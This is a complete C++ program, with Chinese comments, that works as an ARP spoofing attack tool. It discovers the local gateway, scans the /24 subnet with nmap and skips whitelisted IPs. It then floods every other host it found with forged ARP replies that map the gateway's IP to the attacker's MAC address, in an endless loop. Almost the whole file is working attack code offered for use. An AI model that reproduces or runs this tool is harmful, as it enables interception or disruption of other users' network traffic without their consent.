#include <iostream>
#include <cstring>
#include <vector>
#include <sstream>
#include <fstream>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <pcap/pcap.h>
#include <unistd.h>
#include <algorithm>
#include <regex>

struct TargetInfo {
  std::string ip;
  uint8_t mac[6];
};

struct arp_packet {
  uint8_t dest_mac[6];
  uint8_t src_mac[6];
  uint16_t eth_type;
  uint16_t hw_type;
  uint16_t proto_type;
  uint8_t hw_len;
  uint8_t proto_len;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

std::string get_gateway_ip(void) 
{
  FILE* fp = popen("ip route | grep default | awk '{print $3}'", "r");
  char buffer[256];
  if (fgets(buffer, sizeof(buffer), fp)) {
    std::string gateway(buffer);
    gateway.erase(std::remove(gateway.begin(), gateway.end(), '\n'), gateway.end());
      
    // 验证IP格式合法性
    std::regex ip_pattern(R"((\d{1,3}\.){3}\d{1,3})");
    if (!std::regex_match(gateway, ip_pattern)) {
      pclose(fp);
      return "";
    }
      
    pclose(fp);
    return gateway;
  }
  pclose(fp);
  return "";
}

void load_whitelist(const std::string& filename, std::vector<std::string>& whitelist) 
{
  std::ifstream file(filename);
  if (!file.is_open()) {
    std::cerr << "警告：无法打开白名单文件 " << filename << std::endl;
    return;
  }
  std::string line;
  while (std::getline(file, line)) {
    line.erase(std::remove(line.begin(), line.end(), '\n'), line.end());
    line.erase(std::remove(line.begin(), line.end(), '\r'), line.end());
    if (!line.empty()) {
      whitelist.push_back(line);
    }
  }
}

std::string get_default_interface(void) 
{
  FILE* fp = popen("ip route | grep default | awk '{print $5}'", "r");
  char buffer[256];
  if (fgets(buffer, sizeof(buffer), fp)) {
    std::string iface(buffer);
    iface.erase(std::remove(iface.begin(), iface.end(), '\n'), iface.end());
    pclose(fp);
    return iface;
  }
  pclose(fp);
  return "";
}

bool get_all_targets(const std::string& subnet, std::vector<TargetInfo>& targets) 
{
  std::string command = "nmap -sn " + subnet;
  FILE* fp = popen(command.c_str(), "r");
  if (!fp) return false;

  char buffer[256];
  std::string current_ip;
  TargetInfo current_info;
  bool mac_found = false;

  while (fgets(buffer, sizeof(buffer), fp)) {
    std::string line(buffer);
    size_t report_pos = line.find("Nmap scan report for ");
    if (report_pos != std::string::npos) {
      size_t ip_start = report_pos + 21;
      std::string remaining = line.substr(ip_start);
      size_t end_pos = remaining.find_first_of(" \n");
      current_ip = remaining.substr(0, end_pos);
      
      if (current_ip.find('(') != std::string::npos) {
        size_t start = current_ip.find('(') + 1;
        size_t end = current_ip.find(')');
        current_ip = current_ip.substr(start, end - start);
      }
      current_ip.erase(std::remove(current_ip.begin(), current_ip.end(), '\n'), current_ip.end());
      mac_found = false;
    }
    else if (line.find("MAC Address: ") != std::string::npos) {
      size_t mac_start = line.find("MAC Address: ") + 13;
      std::string mac_str = line.substr(mac_start);
      size_t end_mac = mac_str.find(' ');
      if (end_mac != std::string::npos) {
        mac_str = mac_str.substr(0, end_mac);
      }
      
      if (sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
          &current_info.mac[0], &current_info.mac[1], &current_info.mac[2],
          &current_info.mac[3], &current_info.mac[4], &current_info.mac[5]) == 6) {
        current_info.ip = current_ip;
        targets.push_back(current_info);
        mac_found = true;
      }
    }
  }
  pclose(fp);
  return !targets.empty();
}

void get_self_mac(const char* iface, uint8_t* mac) 
{
  struct ifreq ifr;
  int sock = socket(AF_INET, SOCK_DGRAM, 0);
  strcpy(ifr.ifr_name, iface);
  ioctl(sock, SIOCGIFHWADDR, &ifr);
  memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
  close(sock);
}

int main(void) 
{
  std::vector<std::string> whitelist;
  load_whitelist("WhiteList.txt", whitelist);

  std::string gateway_ip = get_gateway_ip();
  if (gateway_ip.empty()) {
    std::cerr << "自动获取网关失败，请检查网络连接\n";
    return 1;
  }
  std::cout << "[+] 自动获取网关IP: " << gateway_ip << std::endl;

  size_t last_dot = gateway_ip.find_last_of('.');
  if (last_dot == std::string::npos) {
    std::cerr << "无效的网关IP地址\n";
    return 1;
  }
  std::string subnet = gateway_ip.substr(0, last_dot) + ".0/24";

  std::vector<TargetInfo> all_targets;
  if (!get_all_targets(subnet, all_targets)) {
    std::cerr << "无法扫描网络设备\n";
    return 1;
  }

  std::string iface_name = get_default_interface();
  if (iface_name.empty()) {
    std::cerr << "无法获取网络接口\n";
    return 1;
  }

  std::vector<TargetInfo> targets;
  for (const auto& info : all_targets) {
    if (std::find(whitelist.begin(), whitelist.end(), info.ip) != whitelist.end()) {
      std::cout << "[*] 跳过白名单IP: " << info.ip << std::endl;
      continue;
    }
    targets.push_back(info);
  }

  if (targets.empty()) {
    std::cerr << "没有有效目标IP\n";
    return 1;
  }

  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(iface_name.c_str(), 65536, 1, 1000, errbuf);
  if (!handle) {
    std::cerr << "打开网卡失败: " << errbuf << std::endl;
    return 1;
  }

  uint8_t self_mac[6];
  get_self_mac(iface_name.c_str(), self_mac);

  while(1) {
    for (const auto& target : targets) {
      arp_packet pkt{};
      memcpy(pkt.dest_mac, target.mac, 6);
      memcpy(pkt.src_mac, self_mac, 6);
      pkt.eth_type = htons(0x0806);
      pkt.hw_type = htons(1);
      pkt.proto_type = htons(0x0800);
      pkt.hw_len = 6;
      pkt.proto_len = 4;
      pkt.opcode = htons(2);
      memcpy(pkt.sender_mac, self_mac, 6);
      inet_pton(AF_INET, gateway_ip.c_str(), pkt.sender_ip);
      memcpy(pkt.target_mac, target.mac, 6);
      inet_pton(AF_INET, target.ip.c_str(), pkt.target_ip);

      sleep(0.1);
      if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&pkt), sizeof(pkt)) != 0) {
        std::cerr << "发送失败: " << pcap_geterr(handle) << std::endl;
      }
    }
  }
  pcap_close(handle);
  return 0;
}
